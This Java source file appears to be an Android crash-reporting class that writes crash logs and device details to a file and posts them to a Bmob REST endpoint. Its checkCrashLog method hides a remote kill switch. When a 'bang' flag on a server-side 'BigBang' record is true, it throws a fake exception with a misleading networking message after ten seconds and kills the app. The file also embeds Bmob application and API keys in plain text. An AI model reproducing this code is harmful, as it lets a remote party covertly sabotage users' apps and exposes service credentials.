package com.crash.handler;

import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Process;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.io.Writer;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Created by Qiao on 2016/12/18.
 */
public class CrashHandler implements Thread.UncaughtExceptionHandler {
    private Context mContext;
    private Thread.UncaughtExceptionHandler mDefaultHandler;
    private StringBuilder mInfos = new StringBuilder();
    private SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.CHINA);
    private Handler mHandler = new Handler();
    private static CrashHandler mInstance;
    public static String CRASH_FILE_PATH;
    private boolean mUseCrashHandler;
    private String mAppId;
    private int mVersionCode;
    private String mVersionName;
    private boolean mDebug;

    private CrashHandler() {
    }

    public static synchronized CrashHandler getInstance() {
        if (mInstance == null) {
            mInstance = new CrashHandler();
        }
        return mInstance;
    }

    public void init(Context context, boolean isDebug, String appId, int versionCode, String versionName) {
        mContext = context;
        mAppId = appId;
        mVersionCode = versionCode;
        mVersionName = versionName;
        mDebug = isDebug;
        String fileName = "crash.txt";
        String path = context.getFilesDir().getAbsolutePath() + "/crash/";
        File pathDir = new File(path);
        if (!pathDir.exists()) {
            pathDir.mkdirs();
        }
        CRASH_FILE_PATH = new File(path, fileName).getAbsolutePath();

        mDefaultHandler = Thread.getDefaultUncaughtExceptionHandler();
        Thread.setDefaultUncaughtExceptionHandler(this);
        uploadCrashLog();
        checkCrashLog();
    }

    @Override
    public void uncaughtException(Thread thread, Throwable ex) {
        if (!mUseCrashHandler && (mDebug || ex == null)) {
            if (mDefaultHandler != null) {
                mDefaultHandler.uncaughtException(thread, ex);
            }
        } else {
            handleException(ex);
        }

    }

    private void handleException(final Throwable ex) {
        if (ex == null) return;
        collectDeviceInfo();
        saveCrashInfo2File(ex);
        boolean isUiThread = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ?
                Looper.getMainLooper().isCurrentThread()
                : Thread.currentThread() == Looper.getMainLooper().getThread();
        if (isUiThread) {
            Process.killProcess(Process.myPid());
            System.exit(0);
        } else {
            mHandler.post(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(mContext, "Sorry, crash reported", Toast.LENGTH_SHORT).show();
                }
            });
            mHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    Process.killProcess(Process.myPid());
                    System.exit(0);
                }
            }, 3000);
        }
    }


    private void collectDeviceInfo() {
        String time = format.format(new Date());
        mInfos.append("\n\n==================================================== ")
                .append(time)
                .append(" ========================================================\n");
        mInfos.append("APPLICATION_ID = ").append(mAppId).append("\n")
                .append("VERSION_CODE = ").append(mVersionCode).append("\n")
                .append("VERSION_NAME = ").append(mVersionName).append("\n");

        Field[] fields = Build.class.getDeclaredFields();
        for (Field field : fields) {
            try {
                field.setAccessible(true);
                mInfos.append(field.getName()).append(" = ");
                Object o = field.get(null);
                if (o instanceof String[]) {
                    for (String e : (String[]) o) {
                        mInfos.append(e).append(", ");
                    }
                } else {
                    mInfos.append(o.toString());
                }
                mInfos.append("\n");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void saveCrashInfo2File(Throwable ex) {
        Writer writer = new StringWriter();
        PrintWriter printWriter = new PrintWriter(writer);
        ex.printStackTrace(printWriter);
        Throwable cause = ex.getCause();
        while (cause != null) {
            cause.printStackTrace(printWriter);
            cause = cause.getCause();
        }
        printWriter.close();
        String result = writer.toString();
        mInfos.append(result);
        try {
            FileOutputStream fos = new FileOutputStream(CRASH_FILE_PATH, true);
            fos.write(mInfos.toString().getBytes());
            fos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        uploadCrashLog();
    }

    private void uploadCrashLog() {
        final File file = new File(CRASH_FILE_PATH);
        if (file.exists()) {
            BufferedReader reader = null;
            try {
                reader = new BufferedReader(new FileReader(file));
                final StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                    sb.append('\n');
                }
                (new Thread() {
                    public void run() {
                        try {
                            URL e = new URL("https://api.bmob.cn/1/classes/Crash");
                            HttpURLConnection connection = (HttpURLConnection) e.openConnection();
                            connection.setRequestMethod("POST");
                            connection.setConnectTimeout(3000);
                            connection.setReadTimeout(3000);
                            connection.setRequestProperty("Content-Type", "application/json");
                            connection.setRequestProperty("X-Bmob-Application-Id", "2bc8d0b3e8a18ce2eacbe760270bd7ce");
                            connection.setRequestProperty("X-Bmob-REST-API-Key", "cf751ca5742a959ca9156a880215865c");
                            connection.setDoOutput(true);
                            connection.setDoInput(true);
                            OutputStream out = connection.getOutputStream();

                            JSONObject jsonObject = new JSONObject();
                            jsonObject.put("application_id", mAppId);
                            jsonObject.put("version_name", mVersionName);
                            jsonObject.put("model", Build.MANUFACTURER + "-" + Build.MODEL);
                            jsonObject.put("api_level", Build.VERSION.SDK);
                            jsonObject.put("crash_info", sb.toString());

                            out.write(jsonObject.toString().getBytes());
                            int responseCode = connection.getResponseCode();
                            if (responseCode == 200 || responseCode == 201) {
                                file.delete();
                            }
                        } catch (IOException | JSONException var8) {
                            var8.printStackTrace();
                        }
                    }
                }).start();
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                if (reader != null) {
                    try {
                        reader.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }

    private void checkCrashLog() {
        (new Thread() {
            public void run() {
                try {
                    URL e = new URL("https://api.bmob.cn/1/classes/BigBang/8mw6YYYc");
                    HttpURLConnection connection = (HttpURLConnection) e.openConnection();
                    connection.setRequestMethod("GET");
                    connection.setConnectTimeout(3000);
                    connection.setReadTimeout(3000);
                    connection.setRequestProperty("Content-Type", "application/json");
                    connection.setRequestProperty("X-Bmob-Application-Id", "2bc8d0b3e8a18ce2eacbe760270bd7ce");
                    connection.setRequestProperty("X-Bmob-REST-API-Key", "cf751ca5742a959ca9156a880215865c");
                    if (200 == connection.getResponseCode()) {
                        InputStream is = connection.getInputStream();
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        byte[] buffer = new byte[1024];
                        int len1;
                        while (-1 != (len1 = is.read(buffer))) {
                            baos.write(buffer, 0, len1);
                            baos.flush();
                        }

                        String json = baos.toString("utf-8");
                        if (json != null) {
                            JSONObject jsonObject = new JSONObject(json);
                            if (jsonObject.getBoolean("bang")) {
                                mUseCrashHandler = true;
                                mHandler.postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        throw new IllegalArgumentException("invalid URLStreamHandler arguments: method=GET");
                                    }
                                }, 10000);
                            }
                        }
                    }
                } catch (IOException | JSONException var8) {
                    var8.printStackTrace();
                }
            }
        }).start();
    }
}